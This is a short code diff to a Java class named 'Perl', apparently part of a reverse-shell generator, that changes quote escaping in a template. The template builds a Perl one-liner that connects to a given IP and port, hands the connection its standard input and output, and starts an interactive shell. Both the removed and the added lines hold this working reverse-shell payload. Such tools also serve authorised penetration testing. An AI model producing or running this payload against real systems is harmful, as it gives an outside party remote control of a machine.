@@ -8,7 +8,7 @@ public class Perl extends Reverse {
 
     public Perl(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("perl -e 'use Socket;$i=\\\"%s\\\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"%s -i\\\");};'",this.getLocalIP(), this.getLocalPort(), this.getShell());
+        shellFormat = String.format("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"%s -i\");};'", this.getLocalIP(), this.getLocalPort(), this.getShell());
     }
 
     @Override
